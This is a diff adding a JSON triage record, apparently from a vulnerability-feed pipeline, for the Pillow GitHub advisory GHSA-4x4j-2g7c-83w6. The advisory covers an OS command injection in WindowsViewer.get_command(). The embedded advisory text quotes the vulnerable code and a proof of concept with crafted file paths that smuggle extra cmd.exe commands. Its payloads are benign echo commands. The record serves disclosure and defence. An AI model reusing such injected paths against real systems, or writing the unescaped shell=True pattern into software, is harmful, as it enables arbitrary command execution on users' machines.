@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"1121984919\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/49403381?v=4\", \"events_url\": \"https://api.github.com/users/1121984919/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/1121984919/followers\", \"following_url\": \"https://api.github.com/users/1121984919/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/1121984919/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/1121984919\", \"id\": 49403381, \"login\": \"1121984919\", \"node_id\": \"MDQ6VXNlcjQ5NDAzMzgx\", \"organizations_url\": \"https://api.github.com/users/1121984919/orgs\", \"received_events_url\": \"https://api.github.com/users/1121984919/received_events\", \"repos_url\": \"https://api.github.com/users/1121984919/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/1121984919/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/1121984919/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/1121984919\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55798\", \"cvss\": {\"score\": 4.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L\"}, \"cvss_v4\": {\"score\": null, \"vector_string\": null}}, \"cwe_ids\": [], \"cwes\": [], \"description\": \"### 1. Summary\\r\\n\\r\\n`WindowsViewer.get_command()` constructs a `cmd.exe` shell command by directly embedding a\\r\\nfile path into an f-string without escaping. The result is passed to\\r\\n`subprocess.Popen(..., shell=True)`. Shell metacharacters in the file path — most\\r\\nimportantly a double-quote (`\\\"`) that breaks out of the wrapping, followed by `&` — allow\\r\\ninjection of arbitrary `cmd.exe` commands.\\r\\n\\r\\nThe macOS equivalent (`MacViewer`) correctly applies `shlex.quote()` to the same parameter.\\r\\nThe Linux equivalent (`UnixViewer`) does likewise. Windows is the only platform missing this\\r\\nprotection, despite `shlex.quote` being **already imported** on line 21 of `ImageShow.py`.\\r\\n\\r\\n---\\r\\n\\r\\n### 2. Vulnerable Code\\r\\n\\r\\n**File:** `src/PIL/ImageShow.py`, lines 133–150\\r\\n\\r\\n```python\\r\\nclass WindowsViewer(Viewer):\\r\\n    format = \\\"PNG\\\"\\r\\n    options = {\\\"compress_level\\\": 1, \\\"save_all\\\": True}\\r\\n\\r\\n    def get_command(self, file: str, **options: Any) -> str:\\r\\n        return (\\r\\n            f'start \\\"Pillow\\\" /WAIT \\\"{file}\\\" '    # ← f-string, no escaping\\r\\n            \\\"&& ping -n 4 127.0.0.1 >NUL \\\"\\r\\n            f'&& del /f \\\"{file}\\\"'                # ← same path, unescaped again\\r\\n        )\\r\\n\\r\\n    def show_file(self, path: str, **options: Any) -> int:\\r\\n        if not os.path.exists(path):\\r\\n            raise FileNotFoundError\\r\\n        subprocess.Popen(\\r\\n            self.get_command(path, **options),\\r\\n            shell=True,                          # ← shell=True\\r\\n            creationflags=getattr(subprocess, \\\"CREATE_NO_WINDOW\\\"),\\r\\n        )  # nosec                               # ← Bandit warning suppressed manually\\r\\n        return 1\\r\\n```\\r\\n\\r\\n**Contrast with macOS — SAFE (line 164–168):**\\r\\n```python\\r\\nclass MacViewer(Viewer):\\r\\n    def get_command(self, file: str, **options: Any) -> str:\\r\\n        command = \\\"open -a Preview.app\\\"\\r\\n        command = f\\\"({command} {quote(file)}; sleep 20; rm -f {quote(file)})&\\\"\\r\\n        return command                           # ← shlex.quote() applied\\r\\n```\\r\\n\\r\\n**Cross-platform summary:**\\r\\n\\r\\n| Platform | Class          | `shlex.quote()`? | `shell=True`? | Safe? |\\r\\n|----------|----------------|------------------|---------------|-------|\\r\\n| macOS    | `MacViewer`    | **Yes** (line 168) | No (list args) | ✅ Yes |\\r\\n| Linux    | `UnixViewer`   | **Yes** (line 207) | No (list args) | ✅ Yes |\\r\\n| Windows  | `WindowsViewer`| **No** (line 134–137) | **Yes** (line 148) | ❌ No |\\r\\n\\r\\n`shlex.quote` is imported on line 21. Its omission from the Windows path is a clear\\r\\noversight, not a deliberate design choice.\\r\\n\\r\\n---\\r\\n### 4. Proof of Concept\\r\\n\\r\\nA full working PoC is at `poc_pillow_injection.py`. Key parts:\\r\\n\\r\\n**Part A — Injection string construction (static, no execution):**\\r\\n```python\\r\\nfrom PIL.ImageShow import WindowsViewer\\r\\n\\r\\nviewer = WindowsViewer()\\r\\nevil_path = r'C:\\\\Temp\\\\evil\\\" & echo PWNED & echo \\\"'\\r\\ncmd = viewer.get_command(evil_path)\\r\\nprint(cmd)\\r\\n# Output:\\r\\n# start \\\"Pillow\\\" /WAIT \\\"C:\\\\Temp\\\\evil\\\" & echo PWNED & echo \\\"\\\" && ping ...\\r\\n# ┌─ start \\\"Pillow\\\" /WAIT \\\"C:\\\\Temp\\\\evil\\\"   → fails (file not found)\\r\\n# ├─ & echo PWNED                           → INJECTED COMMAND\\r\\n# └─ & echo \\\"\\\"  && ping ...                → continues\\r\\n```\\r\\n\\r\\n**Part B — Live execution via `os.system()` (verified on Windows 11, Pillow 12.1.1):**\\r\\n```python\\r\\nimport os, tempfile\\r\\nfrom PIL.ImageShow import WindowsViewer\\r\\n\\r\\nviewer = WindowsViewer()\\r\\npoc_dir = tempfile.mkdtemp()\\r\\nmarker  = os.path.join(poc_dir, \\\"INJECTION_CONFIRMED.txt\\\")\\r\\n\\r\\n# Craft injection: payload writes a marker file (harmless)\\r\\npayload   = f'echo REAL_INJECTED > \\\"{marker}\\\"'\\r\\nevil_path = os.path.join(poc_dir, f'poc\\\" & {payload} & echo \\\"')\\r\\n\\r\\n# Call the REAL Pillow get_command():\\r\\nreal_cmd = viewer.get_command(evil_path)\\r\\n\\r\\n# Execute the same way the base Viewer.show_file() does (os.system):\\r\\nos.system(real_cmd)\\r\\n\\r\\nassert os.path.exists(marker)                          # PASSES — marker was created\\r\\nassert \\\"REAL_INJECTED\\\" in open(marker).read()          # PASSES\\r\\n# → CONFIRMED: arbitrary command injection via get_command()\\r\\n```\\r\\n\\r\\n---\", \"ghsa_id\": \"GHSA-4x4j-2g7c-83w6\", \"html_url\": \"https://github.com/python-pillow/Pillow/security/advisories/GHSA-4x4j-2g7c-83w6\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-4x4j-2g7c-83w6\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55798\"}], \"private_fork\": null, \"published_at\": \"2026-07-03T08:30:14Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/3112309?v=4\", \"events_url\": \"https://api.github.com/users/radarhere/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/radarhere/followers\", \"following_url\": \"https://api.github.com/users/radarhere/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/radarhere/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/radarhere\", \"id\": 3112309, \"login\": \"radarhere\", \"node_id\": \"MDQ6VXNlcjMxMTIzMDk=\", \"organizations_url\": \"https://api.github.com/users/radarhere/orgs\", \"received_events_url\": \"https://api.github.com/users/radarhere/received_events\", \"repos_url\": \"https://api.github.com/users/radarhere/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/radarhere/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/radarhere/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/radarhere\", \"user_view_type\": \"public\"}, \"severity\": \"medium\", \"state\": \"published\", \"submission\": null, \"summary\": \"WindowsViewer.get_command() OS command injection via unescaped shell path (CWE-78)\", \"updated_at\": \"2026-07-03T08:30:14Z\", \"url\": \"https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-4x4j-2g7c-83w6\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"pip\", \"name\": \"Pillow\"}, \"patched_versions\": \">= 12.3.0\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 12.2.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "pillow:ghsa-4x4j-2g7c-83w6",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Pillow: <= 12.2.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-55798"
+    ],
+    "cvss_score": 4.5,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+    "fixed_versions": [
+      "Pillow: >= 12.3.0"
+    ],
+    "mitigations": [],
+    "products": [
+      "Pillow"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-17T23:40:05.983215Z",
+  "provenance": {
+    "content_sha256": "38d90528af3dfdcd9468b2f958c9bdd445646190780d1ed67802e5fbfc1c77b0",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-03T08:30:14Z",
+  "schema_version": 1,
+  "source_id": "pillow_github",
+  "source_url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-4x4j-2g7c-83w6",
+  "status": "active",
+  "title": "WindowsViewer.get_command() OS command injection via unescaped shell path (CWE-78)",
+  "updated_at": "2026-07-03T08:30:14Z",
+  "vendor": "Pillow",
+  "vendor_advisory_id": "GHSA-4x4j-2g7c-83w6"
+}
